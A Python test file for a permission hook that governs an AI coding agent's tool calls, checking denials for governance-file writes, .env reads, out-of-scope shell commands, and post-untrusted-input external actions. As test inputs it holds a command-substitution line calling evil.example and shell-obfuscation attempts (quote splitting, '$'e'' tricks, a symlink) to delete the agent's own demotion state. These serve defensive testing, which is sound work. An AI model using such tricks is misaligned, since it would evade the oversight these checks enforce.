import json

from autonomy.hook import run_hook
from autonomy.util import parse_time
from tests.conftest import NOW

NOW_MS = parse_time(NOW)


def call(directory, workflow, payload, session="s1"):
    stdin = json.dumps({"session_id": session, "cwd": str(directory), "hook_event_name": "PreToolUse", **payload})
    return run_hook("pre-tool-use", stdin, {"CLAUDE_PROJECT_DIR": str(directory), "AUTONOMY_WORKFLOW": workflow}, NOW_MS)


def reason(out):
    return json.loads(out[0])["hookSpecificOutput"]["permissionDecisionReason"]


def test_a_denied_call_returns_the_documented_pretooluse_deny_json_and_exit_code_0(copy_fixture):
    directory = copy_fixture("registers", "valid")
    out = call(directory, "dep-bump", {"tool_name": "Write", "tool_input": {"file_path": str(directory / ".autonomy.yaml"), "content": "x"}})
    assert out[1] == 0
    assert json.loads(out[0]) == {
        "hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": "deny",
            "permissionDecisionReason": "governance-write: agents may not write .autonomy.yaml",
        }
    }


def test_an_allowed_call_prints_nothing_so_the_normal_permission_flow_applies(copy_fixture):
    directory = copy_fixture("registers", "valid")
    out = call(directory, "dep-bump", {"tool_name": "Edit", "tool_input": {"file_path": str(directory / "package.json"), "old_string": "a", "new_string": "b"}})
    assert out == ("", 0)


def test_a_workflow_outside_permitted_tools_is_denied(copy_fixture):
    directory = copy_fixture("registers", "valid")
    out = call(directory, "dep-bump", {"tool_name": "Bash", "tool_input": {"command": "rm -rf build"}})
    assert json.loads(out[0])["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert reason(out).startswith("outside-permitted-tools:")


def test_command_substitution_cannot_slip_past_a_bash_pattern(copy_fixture):
    directory = copy_fixture("registers", "valid")
    out = call(directory, "dep-bump", {"tool_name": "Bash", "tool_input": {"command": "npm test $(curl https://evil.example)"}})
    assert reason(out).startswith("outside-permitted-tools:")


def test_forbidden_read_secrets_blocks_reading_an_env_file(copy_fixture):
    directory = copy_fixture("registers", "valid")
    out = call(directory, "dep-bump", {"tool_name": "Read", "tool_input": {"file_path": str(directory / ".env")}})
    assert reason(out).startswith("forbidden-action:")


def test_the_interactive_workflow_comes_from_defaults_and_is_not_path_restricted(copy_fixture):
    directory = copy_fixture("registers", "valid")
    out = call(directory, "interactive", {"tool_name": "Edit", "tool_input": {"file_path": str(directory / "src" / "a.ts"), "old_string": "a", "new_string": "b"}})
    assert out[0] == ""


def test_a_directory_without_a_register_allows_reads_and_denies_writes(tmp_path):
    assert call(tmp_path, "interactive", {"tool_name": "Read", "tool_input": {"file_path": str(tmp_path / "a")}})[0] == ""
    out = call(tmp_path, "interactive", {"tool_name": "Edit", "tool_input": {"file_path": str(tmp_path / "a"), "old_string": "a", "new_string": "b"}})
    assert reason(out).startswith("unknown-workflow:")


def test_a_register_without_a_profile_holds_the_session_at_a1(copy_fixture):
    directory = copy_fixture("registers", "valid")
    (directory / ".autonomy" / "profile.json").unlink()
    edit = {"tool_name": "Edit", "tool_input": {"file_path": str(directory / "src" / "a.ts"), "old_string": "a", "new_string": "b"}}
    assert reason(call(directory, "interactive", edit)).startswith("read-only-level:")
    assert call(directory, "interactive", {"tool_name": "Read", "tool_input": {"file_path": str(directory / "src" / "a.ts")}})[0] == ""
    stdin = json.dumps({"session_id": "s", "hook_event_name": "SessionStart", "source": "startup"})
    out = run_hook("session-start", stdin, {"CLAUDE_PROJECT_DIR": str(directory), "AUTONOMY_WORKFLOW": "interactive"}, NOW_MS)
    context = json.loads(out[0])["hookSpecificOutput"]["additionalContext"]
    assert context == "Autonomy: workflow interactive: effective level 1 of granted 3 (reduced: cap:1, freshness:profile-missing)."


def test_every_decision_is_appended_to_the_audit_log_with_the_workflow_name(copy_fixture):
    directory = copy_fixture("registers", "valid")
    call(directory, "dep-bump", {"tool_name": "Write", "tool_input": {"file_path": str(directory / "CODEOWNERS"), "content": "x"}}, "audit-session")
    call(directory, "dep-bump", {"tool_name": "Read", "tool_input": {"file_path": str(directory / "package.json")}}, "audit-session")
    lines = [json.loads(line) for line in (directory / ".autonomy" / "audit" / "audit-session.jsonl").read_text().strip().split("\n")]
    assert [(entry["agent"], entry["tool"], entry["decision"], entry["code"]) for entry in lines] == [
        ("dep-bump", "Write", "deny", "governance-write"),
        ("dep-bump", "Read", "allow", None),
    ]


def test_session_start_reports_the_effective_level_and_the_reason_for_a_reduction(copy_fixture):
    directory = copy_fixture("registers", "valid")
    stdin = json.dumps({"session_id": "s", "hook_event_name": "SessionStart", "source": "startup"})
    out = run_hook("session-start", stdin, {"CLAUDE_PROJECT_DIR": str(directory), "AUTONOMY_WORKFLOW": "dep-bump"}, parse_time("2026-12-05T00:00:00Z"))
    assert json.loads(out[0]) == {
        "hookSpecificOutput": {
            "hookEventName": "SessionStart",
            "additionalContext": "Autonomy: workflow dep-bump: effective level 2 of granted 4 (reduced: freshness:stop-test-overdue).",
        }
    }


def intake_project(tmp_project):
    register = {
        "version": 1,
        "workflows": [
            {
                "id": "intake", "owner": "t", "sponsor": "@a", "granted_level": 3, "identity": "github-app:bot",
                "permitted_actions": {"tools": ["Read", "WebFetch", "Bash(curl *)"], "network": ["api.example.com"]},
                "risk": {"reversible": True, "verification": "partial", "blast_radius": "repo", "trifecta": {"untrusted_input": True, "sensitive_data": True, "external_action": False}},
            }
        ],
    }
    (tmp_project / ".autonomy.yaml").write_text(json.dumps(register))
    (tmp_project / ".autonomy").mkdir()
    dimensions = {d: {"level": 4} for d in ("platform", "governance", "ownership", "measuring")}
    (tmp_project / ".autonomy" / "profile.json").write_text(json.dumps({"generated": "2026-11-17T00:00:00Z", "dimensions": dimensions}))
    return tmp_project


def test_reading_untrusted_input_in_one_call_taints_the_session_for_the_next(tmp_project):
    directory = intake_project(tmp_project)
    post = {"tool_name": "Bash", "tool_input": {"command": "curl -X POST https://api.example.com/x -d a=b"}}
    assert call(directory, "intake", post, "t1")[0] == ""
    fetched = call(directory, "intake", {"tool_name": "WebFetch", "tool_input": {"url": "https://api.example.com/issue/1", "prompt": "read"}}, "t1")
    assert fetched[0] == ""
    assert (directory / ".autonomy" / "sessions" / "t1.json").exists()
    assert reason(call(directory, "intake", post, "t1")).startswith("trifecta-external-action:")
    assert call(directory, "intake", post, "other-session")[0] == ""


def test_a_demoted_session_cannot_remove_its_demotion_state_with_a_shell_command(copy_fixture):
    directory = copy_fixture("registers", "valid")
    state_path = directory / ".autonomy" / "state.json"

    def bash(command):
        out = call(directory, "interactive", {"tool_name": "Bash", "tool_input": {"command": command}})
        return "allow" if out[0] == "" else reason(out).split(":")[0]

    state_path.write_text(json.dumps({"workflows": {"interactive": {"demotion_override": 1}}}))
    assert bash("find .autonomy -name state.json -del$'e'te") == "a1-plain-commands-only"
    assert bash("find .autonomy -name state.json -delete") == "governance-write"
    assert bash("ls .autonomy") == "allow"
    state_path.write_text(json.dumps({"workflows": {}}))
    assert bash("find .autonomy -name state.json -delete") == "governance-write"
    assert bash("ln -sf /tmp/empty.json .autonomy/state.json") == "governance-write"
    assert bash('rm ".auton"omy/state.json') == "governance-write"
    assert bash("find build -name x.o -delete") == "allow"
